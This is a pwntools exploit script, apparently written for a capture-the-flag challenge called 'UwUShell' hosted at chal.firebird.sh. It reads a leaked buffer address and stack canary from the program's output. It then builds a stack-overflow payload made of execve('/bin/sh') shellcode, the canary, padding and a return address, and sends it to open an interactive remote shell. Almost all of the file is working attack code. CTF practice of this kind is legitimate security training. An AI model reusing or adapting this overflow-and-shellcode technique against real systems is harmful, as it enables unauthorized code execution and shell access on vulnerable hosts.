#!/usr/bin/env python3
from enum import Enum
from pwn import *


# ----------------------=[Python Stuff]=---------------------- #

class Mode(Enum):
    DEBUG = 0
    LOCAL = 1
    REMOTE = 2


# ----------------------=[Packing Utils]=---------------------- #

p64 = lambda n: packing.pack(n, 64)
u64 = lambda n: packing.unpack(n, 64)
u32 = lambda n: packing.unpack(n, 32)
uu64 = lambda data: u64(data.ljust(8, b'\x00'))
uu32 = lambda data: u32(data.ljust(4, b'\x00'))

# ---------------------=[Common Settings]=--------------------- #

bin_path = './UwUShellpatched'
local_libc_path = './libc.so.6'
remote_url = 'chal.firebird.sh'
remote_port = 35024

context.log_level = 'debug'
context.binary = bin_path

gdb_break_points = [
    ''
]


# ------------------------=[Exploit]=-------------------------- #

def initialize_io(mode: Mode) -> process | remote:
    gdbscripts = "handle SIGALRM ignore\n"
    for bp in gdb_break_points:
        if bp:  # is not empty str
            gdbscripts += f"b* {bp}\n"

    # Initialize io based on mode
    match mode:
        case Mode.DEBUG:
            # context.terminal = ["tmux", "splitw", "-h"]
            return gdb.debug([bin_path], gdbscripts)
        case Mode.LOCAL:
            return process([bin_path])
        case Mode.REMOTE:
            return remote(remote_url, remote_port)
        case _:
            exit(-1)


# -----------------------=[Main Pwn]=-------------------------- #

def do_pwn(io: process | remote) -> None:
    sla = io.sendlineafter
    sa = io.sendafter
    sl = io.sendline
    sd = io.send
    rl = io.recvline
    ru = io.recvuntil

    rop = ROP(bin_path)
    elf = ELF(bin_path)
    libc = ELF(local_libc_path)

    def exploit() -> None:
        # Leak address of UwU
        ru(b'0x')
        UwU_addr_read = int(ru(b' ', drop=True), 16)
        log.info(f'UwU_addr_read: {hex(UwU_addr_read)}')

        # Get canary
        ru(b'0x')
        canary = int(ru(b' ', drop=True), 16)
        log.info(f'canary: {hex(canary)}')

        # Shellcode

        # 0x68732f2f6e69622f is /bin/sh in hex
    #     shellcode = asm('''
    # mov rax, 0x68732f2f6e69622f
    # push rax
    # mov rdi, rsp
    #
    # xor rsi, rsi
    # xor rdx, rdx
    # mov rax, 0x3b
    #
    # syscall
    #     ''')

        shellcode = asm('''
xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall
        ''')

        log.info(f"Length of shellcode: {len(shellcode)} ({hex(len(shellcode))})")

        if len(shellcode) > 0x18:
            log.error(f"Shellcode length is greater than 0x18: {len(shellcode)} ({hex(len(shellcode))})")
            return

        payload = flat(
            shellcode.ljust(0x18, b'\x00'),
            p64(canary),
            b'C' * 0x8,
            UwU_addr_read
        )

        log.info(f"Payload: {payload}")
        log.info(f"Length of payload: {len(payload)} ({hex(len(payload))})")

        if len(payload) != 0x30:
            log.error(f"Payload length is not 0x30: {len(payload)} ({hex(len(payload))})")
            return

        sla(b'run?\n', payload)

    exploit()

    # pause()


# --------------------=[End of Exploit]=----------------------- #

def main() -> None:
    io = initialize_io(Mode.REMOTE)
    do_pwn(io)
    io.interactive()


if __name__ == '__main__':
    main()

# ----------------------------=[EOF]=--------------------------- #
